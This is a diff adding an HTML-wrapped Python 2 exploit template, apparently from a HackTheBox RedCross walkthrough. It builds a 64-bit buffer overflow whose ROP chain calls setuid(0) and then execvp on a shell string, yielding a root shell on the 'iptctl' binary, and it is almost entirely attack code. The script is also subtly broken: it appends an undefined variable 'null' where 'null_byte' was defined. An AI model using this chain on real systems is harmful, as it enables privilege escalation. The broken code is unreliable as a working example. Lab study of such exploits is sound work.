@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>64_Bit_ROP_BO_template.py</title>
+</head><body>#/usr/bin/python2<br/>
+# This was used and demonstrated in ippsec RedCross HTB video<br/>
+import struct<br/>
+import os<br/>
+<br/>
+def p64(addr):<br/>
+&nbsp; &nbsp; return struct.pack('&lt;q', addr)<br/>
+<br/>
+junk = "A" * 30<br/>
+<br/>
+# need pop RDI and pop RSI since these are where the first<br/>
+# two arguments are stored. Grabbed from radare (or disassembler)<br/>
+pop_rdi = p64(0x00400de3) &nbsp; &nbsp;# pop rdi; ret<br/>
+pop_rsi = p64(0x00400de1) &nbsp; &nbsp;# pop rsi; pop r15; ret<br/>
+<br/>
+# PLT dumped with objdump: objdump -D -j .plt iptctl | grep \@plt<br/>
+execvp_plt = p64(0x400760)<br/>
+setuid_plt = p64(0x400780)<br/>
+<br/>
+# SH string found in debugger: find sh<br/>
+sh_str = p64(0x40046e)<br/>
+<br/>
+# null byte is just null byte<br/>
+null_byte = p64(0x0)<br/>
+<br/>
+payload = "show"<br/>
+payload += junk<br/>
+#### ROP CHAIN BEGINS ####<br/>
+<br/>
+# calling setuid(0) (requires one argument) #<br/>
+payload += pop_rdi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# grab next and pop rdi<br/>
+payload += null<br/>
+payload += setuid_plt &nbsp; &nbsp; &nbsp; &nbsp;# use it for setuid<br/>
+# finished calling setuid #<br/>
+<br/>
+# calling Execvp(sh,0) #<br/>
+payload += pop_rdi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# grab next and pop rdi<br/>
+payload += sh_str &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # put /bin/dash <br/>
+payload += pop_rsi &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# grab next and pop rsi; pop r15<br/>
+payload += null &nbsp; &nbsp;# 0 in rsi<br/>
+payload += null &nbsp; &nbsp;# 0 in r15<br/>
+payload += execvp_plt &nbsp; &nbsp; &nbsp; &nbsp;# call execvp<br/>
+## finished calling execvp<br/>
+<br/>
+#### ROP CHAIN ENDS #####<br/>
+<br/>
+payload += "\n1.3.3.7"<br/>
+<br/>
+#exe_pointer = "BBBB"<br/>
+#payload = "show" + junk + exe_pointer + "\n1.3.3.7"<br/>
+print payload</body></html>
